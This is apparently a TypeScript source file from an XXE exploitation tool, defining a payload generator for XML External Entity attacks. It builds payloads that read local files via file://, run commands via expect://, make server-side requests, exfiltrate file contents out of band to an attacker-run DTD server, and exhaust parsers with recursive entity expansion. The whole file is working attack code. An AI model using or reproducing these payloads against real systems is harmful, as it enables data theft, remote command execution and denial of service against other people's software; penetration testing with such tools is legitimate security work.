import { XXEServer } from "./XXEServer";

export interface Entity {
  name: string;
  value: string;
  parameter: boolean;
  system: boolean;
}

export enum Type {
  file = 1, request = 2, expect = 3
}

export enum Mode {
  XML = 1, OOB = 2, CDATA = 3
}

export enum Encoding {
  NORMAL = 1,
  PHP_BASE64 = 2
}

export class PayloadGenerator {

  public static PLACEHOLDER = "{{XXE}}";
  public static PLACEHOLDER_REQUEST_B64 = "{{XXE_B64}}";


  public static generate(t: Type, mode: Mode, encoding: Encoding, path: string, template?: string) {

    const methodName = Type[t] + Mode[mode];
    const m = eval("PayloadGenerator." + methodName);

    let payload;
    if (m === Mode.OOB)
      payload = m(path, encoding, template);
    else
      payload = m(path, template);

    return payload;
  }

  public static fileXML(filePath: string, template: string = PayloadGenerator.defaultTemplate()): string {
    const val = PayloadGenerator.fileStream(filePath);
    const xmlPayload = PayloadGenerator.injectDocType(template, PayloadGenerator.createDocType([{ name: "payload", value: val, parameter: false, system: true }]));
    return PayloadGenerator.replacePlaceholderWithEntity(xmlPayload, "payload");
  }

  public static requestXML(url: string, template: string = PayloadGenerator.defaultTemplate()): string {
    const payload = PayloadGenerator.injectDocType(template, PayloadGenerator.createDocType([{ name: "payload", value: url, parameter: false, system: true }]));
    return PayloadGenerator.replacePlaceholderWithEntity("payload", payload);
  }

  public static expectXML(command: string, template: string = PayloadGenerator.defaultTemplate()): string {
    const val = PayloadGenerator.expectStream(command);
    const docType = PayloadGenerator.createDocType([{ name: "payload", value: val, parameter: false, system: true }]);
    const payload = PayloadGenerator.injectDocType(template, docType);

    return PayloadGenerator.replacePlaceholderWithEntity(payload, "payload");
  }

  public static fileOOB(filePath: string, mode: Encoding = Encoding.NORMAL, template: string = PayloadGenerator.defaultTemplate()): string {
    return PayloadGenerator.dataExtraction(PayloadGenerator.fileStream(filePath), mode, template);
  }

  public static expectOOB(command: string, mode: Encoding = Encoding.NORMAL, template: string = PayloadGenerator.defaultTemplate()): string {
    return PayloadGenerator.dataExtraction(PayloadGenerator.expectStream(command), mode, template);
  }

  public static requestOOB(url: string, mode: Encoding = Encoding.NORMAL, template: string = PayloadGenerator.defaultTemplate()): string {
    return PayloadGenerator.dataExtraction(url, mode, template);
  }


  public static requestCDATA(url: string, template: string = PayloadGenerator.defaultTemplate()): string {
    return PayloadGenerator.cdata(url, template);
  }

  public static expectCDATA(command: string, template: string = PayloadGenerator.defaultTemplate()): string {
    const tmp = PayloadGenerator.expectStream(command);
    return PayloadGenerator.cdata(tmp, template);
  }

  public static fileCDATA(filePath: string, template: string = PayloadGenerator.defaultTemplate()): string {
    const path = PayloadGenerator.fileStream(filePath);
    return PayloadGenerator.cdata(path, template);
  }



  //TODO: need to improve this. 
  //maxNumberOfExpantions should be NumberOfExpantions.
  //JDK has a limit of 64000 expansions :( 
  public static xee(maxNumberOfExpantions = 64000, template: string = PayloadGenerator.defaultTemplate()): string {
    const entities = [{
      name: "ent0",
      system: false,
      value: "Ea velit aute anim voluptate aliquip id aute dolore do culpa nisi quis officia sunt quis elit ex sed elit."
    }];

    const b = 10;
    let i = 1;
    let expantions = 1;
    while ((expantions * b) <= maxNumberOfExpantions) {

      const ent = { name: "ent" + i, value: PayloadGenerator.callEntity("ent" + (i - 1)).repeat(b), system: false };
      entities.push(ent);

      i++;
      expantions = expantions * b;
    }


    const tmp = PayloadGenerator.createDocType(entities) + template;
    return PayloadGenerator.replacePlaceholderWithEntity(tmp, "ent" + (i - 1));
  }




  private static cdata(path: string, template: string = PayloadGenerator.defaultTemplate()): string {

    const server = new XXEServer();
    const dtdUrl = server.addRoute("/cdatahelper.dtd", PayloadGenerator.cdataEvilDTDContent(path));
    server.start();


    const docType = PayloadGenerator.createDocType([
      { name: "extDTD", value: `${dtdUrl}`, parameter: true, system: true },
      "%extDTD;",
      "%all;"
    ]);

    const payload = PayloadGenerator.injectDocType(template, docType);
    return PayloadGenerator.replacePlaceholderWithEntity(payload, "content");
  }



  private static cdataEvilDTDContent(payloadAction: string): string {

    let payload =
      PayloadGenerator.createEntityString({ name: "start", value: `<![CDATA[`, parameter: true, system: false }) +
      PayloadGenerator.createEntityString({ name: "path", value: payloadAction, parameter: true, system: true }) +
      PayloadGenerator.createEntityString({ name: "end", value: `]]>`, parameter: true, system: false });

    const subEntity = PayloadGenerator.createEntityString({
      name: "content",
      value: `%start;%path;%end;`,
      parameter: false,
      system: false
    }, Encoding.NORMAL, true);

    payload += PayloadGenerator.createEntityString({ name: "all", value: subEntity, parameter: true, system: false });

    return payload;
  }

  //NOTE THAT SPECIAL CHARACTERS IN THE CONTENT READ MAY BREAK THIS ATTACK
  private static dataExtraction(path: string, encoding: Encoding, template: string): string {


    const entity: Entity = { name: "dataextractionfile", parameter: true, value: path, system: true };

    const server = new XXEServer();
    server.addExtractionRoute();
    const extractionUrl = server.addRoute("/extraction.dtd", PayloadGenerator.dataExtractionEvilDTDContent(entity, encoding));
    server.start();

    const docType = PayloadGenerator.createDocType([
      { name: "extDTD", value: extractionUrl, parameter: true, system: true },
      "%extDTD;",
      "%extraction;",
      "%OOB;"
    ]);


    const payload = PayloadGenerator.injectDocType(template, docType);
    return payload;

  }

  private static dataExtractionEvilDTDContent(mainEntity: Entity, encoding: Encoding): string {
    mainEntity.parameter = true; //just to make sure
    //TODO: change this. we can now generate this case with createEntityString
    return PayloadGenerator.createEntityString(mainEntity, encoding) +
      `<!ENTITY % extraction "<!ENTITY &#x25; OOB SYSTEM '${XXEServer.getServerUrl()}/?p=%${mainEntity.name};'>">\n`;
  }




  //TODO: allow to change doctype name
  private static createDocType(entities: any): string {
    let dt = `<!DOCTYPE xxeDT [\n`;
    entities.forEach((e: any) => {
      if (typeof e === 'string')
        dt += "   " + e + "\n";
      else
        dt += "   " + PayloadGenerator.createEntityString(e);
    });
    dt += "]>\n";

    return dt;
  }


  //inner param is to now if this entity is inside another
  private static createEntityString(entity: Entity, encoding: Encoding = Encoding.NORMAL, inner = false): string {
    let p = " ";
    let system = " ";
    if (entity.parameter) {
      if (inner)
        p = " &#x25; ";
      else
        p = " % ";
    }

    let val = entity.value;


    if ((encoding & Encoding.PHP_BASE64) > 0)
      val = "php://filter/read=convert.base64-encode/resource=file://" + val;

    if (entity.system)
      system = " SYSTEM ";

    if (inner)
      return `<!ENTITY${p}${entity.name}${system}'${val}'>`;
    else
      return `<!ENTITY${p}${entity.name}${system}"${val}">\n`;

  }

  private static injectDocType(xmlContent: string, docType: string): string {
    if (xmlContent.includes("<?xml")) {
      const startIndex = xmlContent.indexOf("<?xml");
      const endIndex = xmlContent.indexOf(">", startIndex);
      const xmlDcl = xmlContent.substring(startIndex, endIndex + 1);

      return xmlDcl + "\n" + docType + xmlContent.replace(xmlDcl, "");
    }
    else
      return docType + xmlContent;

  }

  // private generateString(): string {
  //   return Math.random().toString(36).substring(7);
  // }

  private static callEntity(entityName: string): string {
    return `&${entityName};`;
  }

  private static defaultTemplate(): string {
    return `<?xml version="1.0" encoding="UTF-8"?>
    <xxeexploiter>
      <value>{{XXE}}</value>
    </xxeexploiter>`;
  }

  private static replacePlaceholderWithEntity(xmlPayload: string, entityName: string): string {
    return xmlPayload.replace(PayloadGenerator.PLACEHOLDER, `${PayloadGenerator.callEntity(entityName)}`);
  }

  private static fileStream(file: string): string {
    return "file://" + file;
  }

  private static expectStream(file: string): string {
    return "expect://" + file;
  }

}